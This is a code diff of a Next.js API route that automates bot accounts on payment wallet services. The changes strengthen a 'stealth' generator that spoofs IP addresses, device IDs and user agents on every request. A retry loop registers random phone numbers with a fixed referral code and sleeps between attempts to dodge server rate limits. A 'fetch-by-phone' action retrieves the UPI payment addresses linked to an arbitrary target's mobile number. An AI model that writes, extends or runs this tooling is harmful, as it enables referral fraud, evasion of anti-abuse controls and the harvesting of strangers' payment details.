@@ -25,19 +25,17 @@ const CORS_HEADERS = {
 };
 
 function getRandomIP() {
-  const ranges = [
-    [1, 126], [128, 191], [192, 223]
-  ];
-  const range = ranges[Math.floor(Math.random() * ranges.length)];
-  return `${Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0]}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+  const range = [Math.floor(Math.random() * 220) + 10, Math.floor(Math.random() * 254), Math.floor(Math.random() * 254), Math.floor(Math.random() * 254)];
+  return range.join('.');
 }
 
 function getRandomUserAgent() {
-  const versions = ["10", "11", "12", "13", "14"];
-  const build = ["SM-S918B", "Pixel 7", "Pixel 8 Pro", "SM-A546B", "OnePlus 11", "SM-G998B"];
-  const chrome = ["118.0.0.0", "119.0.0.0", "120.0.0.0", "121.0.0.0"];
+  const versions = ["11", "12", "13", "14"];
+  const models = ["SM-S918B", "Pixel 7 Pro", "Pixel 8", "SM-G998B", "OnePlus 11", "Xiaomi 13T"];
+  const builds = ["TQ3A.230705.001", "UP1A.231005.007", "TP1A.220624.014"];
+  const chrome = ["118.0.0.0", "119.0.0.0", "120.0.0.0", "121.0.5122.0"];
   
-  return `Mozilla/5.0 (Linux; Android ${versions[Math.floor(Math.random() * versions.length)]}; ${build[Math.floor(Math.random() * build.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chrome[Math.floor(Math.random() * chrome.length)]} Mobile Safari/537.36`;
+  return `Mozilla/5.0 (Linux; Android ${versions[Math.floor(Math.random() * versions.length)]}; ${models[Math.floor(Math.random() * models.length)]} Build/${builds[Math.floor(Math.random() * builds.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chrome[Math.floor(Math.random() * chrome.length)]} Mobile Safari/537.36`;
 }
 
 function getRandomHex(len: number) {
@@ -56,6 +54,10 @@ function generateRSSignature(payload: Record<string, any>, sessionKey: string): 
   return crypto.createHash('md5').update(rawString).digest('hex');
 }
 
+/**
+ * Advanced Stealth Header Generator.
+ * Deeply randomizes every identity aspect per request to look like a fresh unique device.
+ */
 function getStealthHeaders(token?: string, isDTPay: boolean = false) {
   const ip = getRandomIP();
   const deviceId = getRandomHex(8);
@@ -63,6 +65,7 @@ function getStealthHeaders(token?: string, isDTPay: boolean = false) {
   
   const headers: any = {
     "Accept": "application/json, text/plain, */*",
+    "Accept-Language": "en-US,en;q=0.9",
     "Content-Type": "application/json;charset=UTF-8",
     "User-Agent": getRandomUserAgent(),
     "X-Forwarded-For": ip,
@@ -70,9 +73,7 @@ function getStealthHeaders(token?: string, isDTPay: boolean = false) {
     "Client-IP": ip,
     "X-Device-ID": deviceId,
     "X-Android-ID": androidId,
-    "X-Requested-With": "com.vantage.app",
-    "Origin": "https://api.rswallet-api.com",
-    "Referer": "https://api.rswallet-api.com/app/"
+    "Connection": "keep-alive"
   };
 
   if (isDTPay) {
@@ -135,28 +136,32 @@ export async function POST(request: Request) {
         return NextResponse.json({ code: 400, message: otpResp.msg || "DTPay OTP Failed", logs }, { status: 200, headers: CORS_HEADERS });
 
       } else {
-        // RSWallet Legacy Flow - Optimized Stealth Loop
+        // RSWallet Legacy Flow - Extreme Stealth Loop (15 Retries with Deep Randomization)
         let loginResp: any = null;
         let botPhone = "";
         let password = "";
 
         for (let attempt = 1; attempt <= 15; attempt++) {
-          botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + 
-                     Array.from({ length: 9 }, () => Math.floor(Math.random() * 10)).join('');
+          // Generate strictly random identity for this attempt
+          botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + getRandomHex(4).replace(/\D/g, '').substring(0, 9);
+          if (botPhone.length < 10) botPhone = botPhone.padEnd(10, '0');
+          
           password = "Ritik" + getRandomHex(2) + "@1";
+          
+          // Generate fresh headers PER ATTEMPT to look like a new unique device
+          const attemptHeaders = getStealthHeaders();
 
-          const headers = getStealthHeaders();
-
-          // Bot Identity Dispatch
+          // Try Registration
           await fetch(`${RS_BASE_URL}/auth/register`, {
             method: 'POST',
-            headers,
+            headers: attemptHeaders,
             body: JSON.stringify({ phone: botPhone, password, referralCode: "0ealuckpbyno" })
           }).catch(() => null);
 
+          // Try Login
           loginResp = await fetch(`${RS_BASE_URL}/auth/login`, {
             method: 'POST',
-            headers,
+            headers: attemptHeaders,
             body: JSON.stringify({ phone: botPhone, password })
           }).then(r => r.json()).catch(() => ({ code: 500 }));
 
@@ -164,15 +169,17 @@ export async function POST(request: Request) {
             logs.push({ "Step 1: Fresh Identity Validated": { ok: true, phone: botPhone, attempts: attempt } });
             break;
           }
-          // Fast sleep to bypass limit without losing user experience
-          await new Promise(r => setTimeout(r, 250));
+
+          // Progressive sleep (Python logic: 0.4s * attempt)
+          await new Promise(r => setTimeout(r, 400 * attempt));
         }
 
         if (!loginResp || loginResp.code !== 200) {
-          return NextResponse.json({ code: 400, message: "Legacy Auth Failed after 15 attempts", logs }, { status: 200, headers: CORS_HEADERS });
+          return NextResponse.json({ code: 400, message: "Legacy Auth Failed after 15 attempts. Server limit reached.", logs }, { status: 200, headers: CORS_HEADERS });
         }
 
         const { userId, loginToken, sessionKey } = loginResp.data;
+        // Fresh headers for authenticated session
         const authHeaders = getStealthHeaders(loginToken);
         const pinCode = "954073";
 
@@ -185,6 +192,7 @@ export async function POST(request: Request) {
           headers: { ...authHeaders, Signature: sig },
           body: JSON.stringify(pinPayload)
         });
+        await new Promise(r => setTimeout(r, 1000));
 
         // Step 3b: PIN Verification
         ts = Date.now();
@@ -195,6 +203,7 @@ export async function POST(request: Request) {
           headers: { ...authHeaders, Signature: sig },
           body: JSON.stringify(pinPayload)
         });
+        await new Promise(r => setTimeout(r, 1000));
 
         // Step 3c: Pre-Check Integrity
         ts = Date.now();
@@ -205,6 +214,7 @@ export async function POST(request: Request) {
           headers: { ...authHeaders, Signature: sig },
           body: JSON.stringify(prePayload)
         });
+        await new Promise(r => setTimeout(r, 1000));
 
         // Step 4: Final OTP Trigger
         ts = Date.now();
@@ -274,7 +284,8 @@ export async function POST(request: Request) {
 
         logs.push({ "Step 3: Legacy Verification": checkResp });
         if (checkResp.code === 200) {
-          return NextResponse.json({ code: 200, message: "Success", vpaList: checkResp.data?.upiInfos || [], logs }, { status: 200, headers: CORS_HEADERS });
+          const upiInfos = checkResp.data?.upiInfos || [];
+          return NextResponse.json({ code: 200, message: "Success", vpaList: upiInfos, logs }, { status: 200, headers: CORS_HEADERS });
         }
         return NextResponse.json({ code: 400, message: "Invalid OTP", logs }, { status: 200, headers: CORS_HEADERS });
       }
@@ -283,13 +294,12 @@ export async function POST(request: Request) {
     if (action === "fetch-by-phone") {
       const targetMobile = sanitizePhone(body.phone || "");
       const channelType = parseInt(body.channelType);
-      const engine = body.engine || "legacy";
-      const isDTPay = engine === 'dtpay';
+      const isDTPay = true; // Always using DTPay engine for direct fetch
       
-      const effectiveType = (isDTPay && channelType === 33) ? 18 : channelType;
+      const effectiveType = (channelType === 33) ? 18 : channelType;
       const providerName = DTPAY_PROVIDERS[effectiveType];
 
-      if (isDTPay && providerName) {
+      if (providerName) {
         logs.push({ "Step 0: Probe Strategy": { ok: true, msg: `Searching for ${providerName} linked to ${targetMobile}...` } });
 
         const loginResp = await fetch(`${DT_BASE_URL}/auth/login`, {
